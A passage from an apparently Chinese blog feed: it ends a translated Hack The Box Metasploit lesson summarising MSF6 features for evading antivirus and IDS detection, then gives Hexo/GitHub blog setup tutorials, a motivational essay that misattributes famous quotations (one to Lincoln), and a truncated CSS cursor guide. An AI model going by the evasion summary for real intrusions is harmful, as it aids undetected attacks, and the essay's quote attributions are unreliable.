href="https://academy.hackthebox.com/module/39/section/404"> 模块</a><a href="https://academy.hackthebox.com/module/39/section/408">目标</a><a href="https://academy.hackthebox.com/module/39/section/407"> 有效载荷</a><a href="https://academy.hackthebox.com/module/39/section/409">编码器</a><a href="https://academy.hackthebox.com/module/39/section/411">数据库</a><a href="https://academy.hackthebox.com/module/39/section/413">插件和混合</a></p><h6 id="无国界医生会议"><a href="#无国界医生会议" class="headerlink" title="无国界医生会议"></a>无国界医生会议</h6><p><a href="https://academy.hackthebox.com/module/39/section/415"> 会议和工作</a><a href="https://academy.hackthebox.com/module/39/section/414"> 计价器</a></p><h6 id="附加功能"><a href="#附加功能" class="headerlink" title="附加功能"></a>附加功能</h6><p><a href="https://academy.hackthebox.com/module/39/section/417">编写和导入模块</a><a href="https://academy.hackthebox.com/module/39/section/418">MSF毒液简介</a><a href="https://academy.hackthebox.com/module/39/section/416">防火墙和 IDS&#x2F;IPS 规避</a><a href="https://academy.hackthebox.com/module/39/section/493">Metasploit 框架更新 - 2020 年 8 月</a></p><h5 id="我的工作站"><a href="#我的工作站" class="headerlink" title="我的工作站"></a>我的工作站</h5><h1 id="Metasploit-框架更新-2020-年-8-月"><a href="#Metasploit-框架更新-2020-年-8-月" class="headerlink" title="Metasploit 框架更新 - 2020 年 8 月"></a>Metasploit 框架更新 - 2020 年 8 月</h1><hr><p>更新到 MSF6 将使所有以前的负载会话无法使用（如果它们是使用 MSF5 建立的）。此外，使用 MSF5 生成的有效负载将不适用于 MSF6 通信机制。我们在下面总结了 2020 年 8 月 MSF 控制台更新带来的更改和添加。</p><hr><h2 id="生成特征"><a href="#生成特征" class="headerlink" title="生成特征"></a>生成特征</h2><ul><li>所有五种实现（Windows、Python、Java、Mettle 和 PHP）的跨 Meterpreter 会话的端到端加密</li><li>SMBv3 客户端支持以进一步启用现代开发工作流程</li><li>Windows shellcode 的新多态负载生成例程，可提高针对常见防病毒和入侵检测系统 (IDS) 产品的规避能力</li></ul><hr><h2 id="扩展加密"><a href="#扩展加密" class="headerlink" title="扩展加密"></a>扩展加密</h2><ul><li>为某些网络操作和 Metasploit 的主要有效载荷二进制文件创建基于签名的检测的复杂性增加</li><li>在攻击者和目标系统之间的通信期间，所有 Meterpreter 有效负载将使用 AES 加密</li><li>SMBv3 加密集成将增加用于识别通过 SMB 执行的关键操作的基于签名的检测的复杂性</li></ul><hr><h2 id="更清洁的有效载荷工件"><a href="#更清洁的有效载荷工件" class="headerlink" title="更清洁的有效载荷工件"></a>更清洁的有效载荷工件</h2><ul><li>Windows Meterpreter 使用的 DLL 现在通过序号而不是名称解析必要的函数</li><li>反射加载 DLL 使用的标准导出 ReflectiveLoader 不再作为文本数据出现在负载二进制文件中</li><li>Meterpreter 向框架公开的命令现在被编码为整数而不是字符串</li></ul><hr><h2 id="插件-2"><a href="#插件-2" class="headerlink" title="插件"></a>插件</h2><p>旧的 Mimikatz Meterpreter 扩展被移除，取而代之的是它的继任者 Kiwi。因此，在可预见的未来，加载 Mimikatz 的尝试将加载 Kiwi。</p><hr><h2 id="有效载荷-1"><a href="#有效载荷-1" class="headerlink" title="有效载荷"></a>有效载荷</h2><p>将 shellcode 静态生成例程替换为随机化例程，该例程通过每次随机化指令向该关键存根添加多态属性。要阅读有关这些更改的更多信息并查看完整的更改日志，请<a href="https://blog.rapid7.com/2020/08/06/metasploit-6-now-under-active-development/">点击此链接</a>。</p><hr><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>正如我们在本模块中看到的，Metasploit 是一个强大的框架。虽然经常被误用和贴错标签，但如果使用得当，它可以成为我们渗透测试武器库的重要组成部分。它具有高度可扩展性，非常适合在评估期间跟踪数据，并且非常适合后期开发和促进枢转。值得尝试 Metasploit 提供的所有功能；您可能会找到一种非常适合您的工作流程的方式。如果你想避免它，那也没关系！那里有很多工具，我们应该使用我们最熟悉的工具。要使用此工具进行更多练习，请查看本模块末尾标记的 HTB 盒子，或使用 Metasploit 尝试任何盒子或 Academy 模块目标。您还可以在 Dante Pro Lab 中练习它（尤其是它的旋转能力）。</p><p><a href="https://academy.hackthebox.com/module/39/section/416">以前的</a>结束</p><p>备忘单</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;author: &lt;a href=&quot;https://zengqi0.github.io/2023/04/23/%E4%BD%BF%E7%94%A8METASPLOIT%E6%A1%86%E6%9E%B6/&quot;&gt;Answer_77&lt;/a&gt;&lt;/p&gt;
&lt;/b</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://touristdaughter.cyou/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="HTB" scheme="https://touristdaughter.cyou/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/HTB/"/>
    
    
  </entry>
  
  <entry>
    <title>Hexo使用SSH连接GitHub</title>
    <link href="https://touristdaughter.cyou/2024/04/09/Hexo%E4%BD%BF%E7%94%A8SSH%E8%BF%9E%E6%8E%A5GitHub/"/>
    <id>https://touristdaughter.cyou/2024/04/09/Hexo%E4%BD%BF%E7%94%A8SSH%E8%BF%9E%E6%8E%A5GitHub/</id>
    <published>2024-04-09T15:06:30.131Z</published>
    <updated>2024-04-09T15:24:54.969Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexo使用SSH连接GitHub"><a href="#Hexo使用SSH连接GitHub" class="headerlink" title="Hexo使用SSH连接GitHub"></a>Hexo使用SSH连接GitHub</h1><p>步骤：</p><h2 id="1-设置全局变量"><a href="#1-设置全局变量" class="headerlink" title="1.设置全局变量"></a>1.设置全局变量</h2><h3 id="查看Git环境所有配置"><a href="#查看Git环境所有配置" class="headerlink" title="查看Git环境所有配置"></a>查看Git环境所有配置</h3><p>Win+R打开命令行窗口，并输入以下代码：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure><p>如果没有配置<code>user.name</code>和<code>user.email</code>则需要先配置</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;用户名随意&quot;</span><br><span class="line">git config --global user.email  &quot;<span class="number">123456</span>@qq.com&quot; #填写github注册的邮箱</span><br></pre></td></tr></table></figure><h2 id="2-查看SSH-Key"><a href="#2-查看SSH-Key" class="headerlink" title="2.查看SSH Key"></a>2.查看SSH Key</h2><p>在电脑桌面上Git Bush，输入以下命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh </span><br><span class="line">ls </span><br></pre></td></tr></table></figure><h2 id="3-生成密钥"><a href="#3-生成密钥" class="headerlink" title="3.生成密钥"></a>3.生成密钥</h2><p>在电脑桌面上Git Bush，输入以下命令行</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat id_rsa.pub #查看公钥并复制</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;你的github邮箱&quot; #没有的话执行此命令生成公钥和私钥</span><br></pre></td></tr></table></figure><h2 id="4-复制密钥到github"><a href="#4-复制密钥到github" class="headerlink" title="4.复制密钥到github"></a>4.复制密钥到github</h2><p>打开github，点击setting &gt;SSH and GPG keys &gt;New SSH key，取个名字，粘贴密钥即可</p><p>验证是否配置成功:在电脑桌面上Git Bush，输入以下命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com #打开git bash输入此命令，显示successful表示成功</span><br></pre></td></tr></table></figure><p>修改hexo的配置文件.config.yml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:   #部署部分的设置</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:你的用户名/你的仓库名.git  #设置仓库为ssh格式</span><br><span class="line">  branch: master </span><br></pre></td></tr></table></figure><p>再次通过hexo g -d 提交博客代码时就不用输入密码了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Hexo使用SSH连接GitHub&quot;&gt;&lt;a href=&quot;#Hexo使用SSH连接GitHub&quot; class=&quot;headerlink&quot; title=&quot;Hexo使用SSH连接GitHub&quot;&gt;&lt;/a&gt;Hexo使用SSH连接GitHub&lt;/h1&gt;&lt;p&gt;步骤：&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    <category term="关于本站、博客搭建" scheme="https://touristdaughter.cyou/categories/%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99%E3%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="Hexo" scheme="https://touristdaughter.cyou/tags/Hexo/"/>
    
    <category term="GitHub" scheme="https://touristdaughter.cyou/tags/GitHub/"/>
    
  </entry>
  
  <entry>
    <title>利用开源的Hexo框架+Butterfly主题+Github静态资源实现搭建个人博客网站</title>
    <link href="https://touristdaughter.cyou/2024/04/05/%E5%88%A9%E7%94%A8%E5%BC%80%E6%BA%90%E7%9A%84Hexo%E6%A1%86%E6%9E%B6+Butterfly%E4%B8%BB%E9%A2%98+Github%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E5%AE%9E%E7%8E%B0%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/"/>
    <id>https://touristdaughter.cyou/2024/04/05/%E5%88%A9%E7%94%A8%E5%BC%80%E6%BA%90%E7%9A%84Hexo%E6%A1%86%E6%9E%B6+Butterfly%E4%B8%BB%E9%A2%98+Github%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E5%AE%9E%E7%8E%B0%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/</id>
    <published>2024-04-05T14:53:31.724Z</published>
    <updated>2024-04-06T12:54:13.650Z</updated>
    
    <content type="html"><![CDATA[<h1 id="利用开源的Hexo框架-Butterfly主题-Github静态资源实现搭建个人博客网站"><a href="#利用开源的Hexo框架-Butterfly主题-Github静态资源实现搭建个人博客网站" class="headerlink" title="利用开源的Hexo框架+Butterfly主题+Github静态资源实现搭建个人博客网站"></a>利用开源的Hexo框架+Butterfly主题+Github静态资源实现搭建个人博客网站</h1><blockquote><p>本文目的是供<code>互联网IT业界伙伴们</code>和<code>对前端感兴趣的朋友们</code>使用Github仓库的静态资源搭建个人博客网站。<br>参考文章：<a href="https://zhuanlan.zhihu.com/p/688070849%E3%80%81https://juejin.cn/post/6844904039457488910%E3%80%82">https://zhuanlan.zhihu.com/p/688070849、https://juejin.cn/post/6844904039457488910。</a></p></blockquote><p>步骤：</p><h1 id="一、本地配置"><a href="#一、本地配置" class="headerlink" title="一、本地配置"></a>一、本地配置</h1><h2 id="1-安装Node-js"><a href="#1-安装Node-js" class="headerlink" title="1.安装Node.js"></a>1.安装Node.js</h2><p>(1).首先去官网下载，自己利用搜索引擎搜索<code>nodejs官网</code>，因为网址可能随时间产生变化；我目前搜到的官网是：<a href="https://nodejs.org/en%EF%BC%8C%E7%9B%B4%E6%8E%A5%E9%80%89%E6%8B%A9LTS%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85%E3%80%82">https://nodejs.org/en，直接选择LTS版本安装。</a></p><p>(2).下载完成后直接双击打开安装，基本上全部下一步就行。</p><p>(3).一般情况下，安装时默认安装在C盘，我们可以改一下安装位置，改到D盘<code>D:\nodejs\</code>。最后点击<code>Install</code>耐心的等待安装完成即可。</p><p><code>Win</code>键+<code>R</code>键打开运行窗口并输入<code>cmd</code>，如果打不开就按一下<code>F9</code>键。输入cmd打开命令行窗口之后输入<code>node -v</code>,出现版本号即为安装成功；反之，重新安装nodejs。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure><p>图片演示（可跳过）：</p><p><img src="/img/boke1.png"></p><p><img src="/img/boke2.png"></p><p><img src="/img/boke3.png"></p><p><img src="/img/boke4.png"></p><p><img src="/img/boke5.png"></p><p><img src="/img/boke6.png"></p><h2 id="2-安装Git"><a href="#2-安装Git" class="headerlink" title="2.安装Git"></a>2.安装Git</h2><p>打开Git官网下载页面，自己利用搜索引擎搜索官网，因为网址可能随时间产生变化；我目前搜到的官网是：<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a> ，选择自己系统进行下载。</p><p><img src="/img/boke7.png"></p><p><img src="/img/boke8.png"></p><p>下载完成后，直接全程下一步进行安装，步骤有点多，我就不一步步贴图了。（建议也安装在其他盘，不要安装在C盘）</p><p>安装好后，打开cmd打开命令行窗口，输入<code>git --version</code> ,出现版本号则说明安装成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure><p>此时我们回到桌面，点击鼠标右键就会出现:<code>Open Git Bush here</code>, 如果没有就点击<code>更多</code>或<code>显示更多选项</code>即可看见。</p><p><img src="/img/boke9.png"></p><h2 id="3-安装配置Hexo"><a href="#3-安装配置Hexo" class="headerlink" title="3.安装配置Hexo"></a>3.安装配置Hexo</h2><p>(1).安装hexo</p><p>首先，我们建立一个文件夹 比如在D盘建立一个Hexo_blog文件夹，建立好后打开文件夹，点击鼠标右键点击<code>在终端中打开</code></p><p><img src="/img/boke10.png"></p><p>然后输入以下命令行下载安装Hexo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>(2).初始化</p><p>在Hexo_blog文件夹中，鼠标右键点击<code>在终端中打开</code>，输入以下命令行进行初始化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init Hexo_blog</span><br></pre></td></tr></table></figure><p>命令执行完成后，将在Hexo_blog文件夹中生成相应的文件，目录如下：</p><p><img src="/img/boke11.png"></p><p>(3).本地部署</p><p>在Hexo_blog文件夹中，鼠标右键点击<code>Open Git Bush here</code></p><p>紧接着输入以下命令生成静态页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>输入以下命令启动server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>打开浏览器，输入网址: <a href="http://localhost:4000/">http://localhost:4000</a> ，即可看到hexo生成的静态页面。</p><p><code>Ctrl</code>建+点击鼠标左键点一下生成的链接，即可自动从浏览器打开Hexo生成的静态页面。</p><p>如果打不开，需重置端口。谷歌一下，即可搜到解决方案。</p><p>接着输入 <code>npm install</code> 安装所需要的文件。</p><h1 id="二、挑选并应用主题"><a href="#二、挑选并应用主题" class="headerlink" title="二、挑选并应用主题"></a>二、挑选并应用主题</h1><p>默认的主题可能并不是我们想要的效果，那么就可以通过更换主题来实现。可以在官网的主题页面选择想要的主题。这里，选择Butterfly主题来应用。</p><h2 id="1-主题安装"><a href="#1-主题安装" class="headerlink" title="1.主题安装"></a>1.主题安装</h2><p>可通过以下命令安装主题:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</span><br></pre></td></tr></table></figure><h2 id="2-配置butterfly主题"><a href="#2-配置butterfly主题" class="headerlink" title="2.配置butterfly主题"></a>2.配置butterfly主题</h2><p>接着我们打开hexo_blog文件夹下的<code>_config.yml</code>配置文件</p><p><img src="/img/boke12.png"></p><p>点开，拉到最下面，找到这个配置，并把它改成<code>butterfly</code></p><p><img src="/img/boke13.png"></p><p>此时我们再去Git Bash命令窗口执行 <code>hexo g</code> 和 <code>hexo s</code> 命令。</p><p>发现会报一个错 <code>extends includes/layout.pug block content include ./includes/mixins/post-ui.pug #recent-posts.recent-posts +postUI include includes/pagination.pug</code>，这是因为此时我们的项目还缺少依赖，把hexo_blog文件夹在终端打开执行下面的命令安装:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus</span><br></pre></td></tr></table></figure><p>安装完成后再次执行 <code>hexo g</code> 和 <code>hexo s</code> 命令重新打开我们的项目就会发现，butterfly主题已经配置成功。</p><p>如果需要配置其他主题，可以到hexo主题网站去找。（建议选择支持中文的，后期好改）</p><h1 id="三、部署到Github仓库"><a href="#三、部署到Github仓库" class="headerlink" title="三、部署到Github仓库"></a>三、部署到Github仓库</h1><h2 id="1-新建github仓库"><a href="#1-新建github仓库" class="headerlink" title="1.新建github仓库"></a>1.新建github仓库</h2><p>打开我们的GitHub（没有账号的话，先去注册一个） <a href="https://github.com/">https://github.com/</a> 。<br>注册登录好后，点击右上角我们的头像，新建一个仓库</p><p><img src="/img/boke14.png"></p><p><img src="/img/boke15.png"></p><p>命名为 <code>username.github.io</code>（username是你的账号），这里要注意。还有就是新建的仓库一定要选择为<code>Public</code>，并且要勾选<code>Add a README file</code>不然待会我们的项目是访问不了的。点击下方按钮确认创建仓库。<br><img src="/img/boke16.png"></p><h2 id="2-配置hexo部署插件内容"><a href="#2-配置hexo部署插件内容" class="headerlink" title="2.配置hexo部署插件内容"></a>2.配置hexo部署插件内容</h2><p>首先确保安装了 hexo-deployer-git 插件（一般是没有的），如果没有，需要执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>安装插件（待会本地项目生成静态文件部署到github需要执行命令）</p><p>接着打开我们hexo博客项目的配置文件<code>_config.yml</code> ，在最底部找到<code>deploy</code>配置项，修改成下面的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line"> type: git</span><br><span class="line"> repo: git@github.com:username/username.github.io.git #username是你的账号名，username.github.io是你的仓库名</span><br><span class="line"> branch: main #现在github默认是main分支</span><br></pre></td></tr></table></figure><p>github默认branch是<code>main</code>分支，如果出问题了，此处的<code>main</code>就要改成<code>master</code>，对应的GitHub仓库<code>Setting</code>里的branch里面的<code>main</code>也要改成<code>master</code>。</p><p>图片演示（可跳过）：<br><img src="/img/boke17.png"></p><p>返回Git Bash命令行窗口，依次执行以下代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo generate （可以简化成 hexo g ）</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy （可以简化成 hexo d ）</span><br></pre></td></tr></table></figure><p>将hexo_blog里面的<code>public</code>文件提交到GitHub即可。</p><p>然后浏览器中输入 <code>你的GitHub用户名.github.io</code> 即可看到刚刚部署的博客，如果没有出现的话，可以稍微等一会延迟。</p><h1 id="至此，Hexo-Butterfly-Github搭建博客就大功告成了！"><a href="#至此，Hexo-Butterfly-Github搭建博客就大功告成了！" class="headerlink" title="至此，Hexo+Butterfly+Github搭建博客就大功告成了！"></a>至此，Hexo+Butterfly+Github搭建博客就大功告成了！</h1><h1 id="You-success"><a href="#You-success" class="headerlink" title="You success!"></a>You success!</h1><p>顺便说一下，如果需要绑定域名配置的话，请自行利用谷歌搜索引擎搜索，善于利用搜索引擎检索并解决问题是每一个程序员的必备技能。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;利用开源的Hexo框架-Butterfly主题-Github静态资源实现搭建个人博客网站&quot;&gt;&lt;a href=&quot;#利用开源的Hexo框架-Butterfly主题-Github静态资源实现搭建个人博客网站&quot; class=&quot;headerlink&quot; title=&quot;利用开源</summary>
      
    
    
    
    <category term="关于本站、博客搭建" scheme="https://touristdaughter.cyou/categories/%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99%E3%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="Hexo" scheme="https://touristdaughter.cyou/tags/Hexo/"/>
    
    <category term="GitHub" scheme="https://touristdaughter.cyou/tags/GitHub/"/>
    
    <category term="Butterfly" scheme="https://touristdaughter.cyou/tags/Butterfly/"/>
    
    <category term="Domain" scheme="https://touristdaughter.cyou/tags/Domain/"/>
    
  </entry>
  
  <entry>
    <title>理性和自驱力，自律与独立</title>
    <link href="https://touristdaughter.cyou/2024/04/05/%E7%90%86%E6%80%A7%E5%92%8C%E8%87%AA%E9%A9%B1%E5%8A%9B%EF%BC%8C%E8%87%AA%E5%BE%8B%E4%B8%8E%E7%8B%AC%E7%AB%8B/"/>
    <id>https://touristdaughter.cyou/2024/04/05/%E7%90%86%E6%80%A7%E5%92%8C%E8%87%AA%E9%A9%B1%E5%8A%9B%EF%BC%8C%E8%87%AA%E5%BE%8B%E4%B8%8E%E7%8B%AC%E7%AB%8B/</id>
    <published>2024-04-05T09:35:19.997Z</published>
    <updated>2025-04-29T22:37:06.930Z</updated>
    
    <content type="html"><![CDATA[<h1 id="理性和自驱力，自律与独立"><a href="#理性和自驱力，自律与独立" class="headerlink" title="理性和自驱力，自律与独立"></a>理性和自驱力，自律与独立</h1><p>首先，<code>理性是我们行动的指南</code>。在这个纷繁复杂的世界里，保持理性能够让我们更加明确目标，避免盲目行事。理性使我们能够分析问题、制定解决方案，并在困境中保持冷静和信心。正如哲学家<br>Descartes所说：“我思，故我在。”理性让我们成为独立的个体，拥有独特的价值观和思考方式。</p><p>其次，<code>自驱力是我们前进的动力</code>。在追求目标的过程中，我们需要坚定的信念和不懈的努力。自驱力使我们克服困难和挫折，勇往直前。正如美国总统林肯所说：“我之所以成功，是因为我站在巨人的肩膀上。” 自驱力让我们不断提升自己，实现更高的成就。</p><p>再者，欣赏他人的优点是我们人际关系中不可或缺的一环。每个人都有自己的闪光点，学会欣赏他人的优点不仅能增进友谊，还能让我们从中学习到许多有益的知识和经验。摒弃嫉妒，拥抱欣赏，我们将收获更多的快乐和成长。</p><p>嫉妒，如同一道阴霾，遮蔽了我们看待世界的目光。它让我们陷入无尽的比较和痛苦，使我们无法专注于自己的道路和梦想。唯有摒弃嫉妒，我们才能洗净心中的尘埃，让阳光照进心灵。</p><p>摒弃嫉妒，首先是对自己的一种解放。当我们不再嫉妒他人的成就，便能更好地认识自己，发掘自己的潜能，勇敢地追求属于自己的目标。正如莎士比亚所说：“嫉妒是心灵的毒药。”唯有摒弃嫉妒，我们才能拯救自己的灵魂，踏上真正的成长之路。</p><p>其次，摒弃嫉妒有助于我们建立和谐的人际关系。嫉妒让我们心生恶念，破坏友谊，伤害他人。当我们学会尊重他人，欣赏他们的优点和成就，便能建立起真诚、互助的人际关系。正如我国古人所言：“三人行，必有我师。” 摒弃嫉妒，让我们学会与他人共同进步。</p><p>由此观之，<code>摒弃嫉妒不仅是对民众的一种解放，更是一种心灵上的自律，是有关内在修养的协调和稳定。</code></p><p>再者，摒弃嫉妒有助于社会的和谐发展。嫉妒如同病毒，蔓延至社会各个角落，导致矛盾激化、冲突不断。若要实现社会和谐，我们需<code>从个人做起，摒弃嫉妒，传递正能量。只有这样，我们才能共同创造一个美好的未来。</code></p><p>此外，关于<code>人与人之间的独立性</code>，事实确实如此。我们都是独立的个体，拥有自己的思想、情感和行为。尽管我们生活在一个社会中，但每个人都需要学会独立思考，明确自己的价值观和目标。只有这样，我们才能在这个瞬息万变的世界中保持自我，实现真正的成长。</p><p>最后，<code>每个人都是独立的个体</code>的观点深入人心。确实，<code>别人的事情与我们无关，我们应专注于自己的生活和事业。</code> 每个人的成长和经历都是独特的，我们需要<code>尊重这种差异</code>，避免对他人事务过分干涉。</p><p><code>[理性和自驱力，自律与独立]</code>能让我们更加珍惜当下。生活中，我们常常为他人的成功而懊恼，为得不到的东西而痛苦。然而，时光荏苒，生命短暂。让我们学会珍惜眼前的幸福和快乐，拥抱每一个美好的瞬间。</p><p>愿我们能携手共创美好未来，让心灵沐浴在阳光之中。愿我们如同璀璨的星辰，照亮彼此的人生。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;理性和自驱力，自律与独立&quot;&gt;&lt;a href=&quot;#理性和自驱力，自律与独立&quot; class=&quot;headerlink&quot; title=&quot;理性和自驱力，自律与独立&quot;&gt;&lt;/a&gt;理性和自驱力，自律与独立&lt;/h1&gt;&lt;p&gt;首先，&lt;code&gt;理性是我们行动的指南&lt;/code&gt;。在这个</summary>
      
    
    
    
    <category term="博主的观点和态度" scheme="https://touristdaughter.cyou/categories/%E5%8D%9A%E4%B8%BB%E7%9A%84%E8%A7%82%E7%82%B9%E5%92%8C%E6%80%81%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>hexo+butterfly主题利用css部署网站鼠标指针样式</title>
    <link href="https://touristdaughter.cyou/2024/04/05/hexo+butterfly%E4%B8%BB%E9%A2%98%E5%88%A9%E7%94%A8css%E9%83%A8%E7%BD%B2%E7%BD%91%E7%AB%99%E9%BC%A0%E6%A0%87%E6%8C%87%E9%92%88%E6%A0%B7%E5%BC%8F/"/>
    <id>https://touristdaughter.cyou/2024/04/05/hexo+butterfly%E4%B8%BB%E9%A2%98%E5%88%A9%E7%94%A8css%E9%83%A8%E7%BD%B2%E7%BD%91%E7%AB%99%E9%BC%A0%E6%A0%87%E6%8C%87%E9%92%88%E6%A0%B7%E5%BC%8F/</id>
    <published>2024-04-05T08:51:16.637Z</published>
    <updated>2024-04-05T14:56:49.936Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hexo-butterfly主题利用css部署网站鼠标指针样式"><a href="#hexo-butterfly主题利用css部署网站鼠标指针样式" class="headerlink" title="hexo+butterfly主题利用css部署网站鼠标指针样式"></a>hexo+butterfly主题利用css部署网站鼠标指针样式</h1><h2 id="步骤-五步走："><a href="#步骤-五步走：" class="headerlink" title="步骤-五步走："></a>步骤-五步走：</h2><h3 id="1-下载鼠标指针"><a href="#1-下载鼠标指针" class="headerlink" title="1.下载鼠标指针"></a>1.下载鼠标指针</h3><p>利用搜索引擎搜索并下载自己钟意的鼠标指针，这里推荐去<code>致美化网站</code>进行点击下载：<a href="https://zhutix.com/tag/cursors/">https://zhutix.com/tag/cursors/</a></p><p><img src="/img/cursor1.png"></p><h3 id="2-保存鼠标指针图片"><a href="#2-保存鼠标指针图片" class="headerlink" title="2.保存鼠标指针图片"></a>2.保存鼠标指针图片</h3><p>将cursor格式<code>.cur</code>的鼠标指针图片选两张分别命名为<code>anormal.cur</code>和<code>apointer.cur</code>放进<code>hexo_blog\themes\butterfly\source\img</code>路径下。</p><p><img src="/img/cursor2.png"></p><h3 id="3-创建css"><a href="#3-创建css" class="headerlink" title="3.创建css"></a>3.创建css</h3><p>在本地博客<code>hexo_blog\themes\butterfly\source\css</code>路径下创建<code>cursors.css</code>并将以下代码复制粘贴到<code>cursors.css</code>中进行保存。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">cursor</span>:<span class="built_in">url</span>(<span class="string">&#x27; /img/anormal.cur&#x27;</span>),</span><br><span class="line">          default;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-tag">a</span>,</span><br><span class="line">  <span class="selector-tag">img</span> &#123;</span><br><span class="line">    <span class="attribute">cursor</span>:<span class="built_in">url</span>(<span class="string">&#x27; /img/apointer.cur&#x27;</span>),</span><br><span class="line">          default;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>图片演示（可跳过）：<br><img src="/img/cursor3.png"><br><img src="/img/cursor4.png"></p><h3 id="4-yml代码注入-Inject"><a href="#4-yml代码注入-Inject" class="headerlink" title="4.yml代码注入-Inject"></a>4.yml代码注入-<code>Inject</code></h3><p>打开站点butterfly主题的config配置文件<code>_config.butterfly.yml</code>或<code>_config.yml</code>，找到inject，在head处直接引入该文件：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;</span> <span class="string">/css/cursors.css&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>图片演示（可跳过）：</p><p><img src="/img/cursor5.png"></p><p><img src="/img/cursor6.png"></p><h3 id="5-部署"><a href="#5-部署" class="headerlink" title="5.部署"></a>5.部署</h3><p>在hexo根目录点击鼠标右键选择<code>Open Git Bush here</code>，输入以下代码进行部署：</p><figure 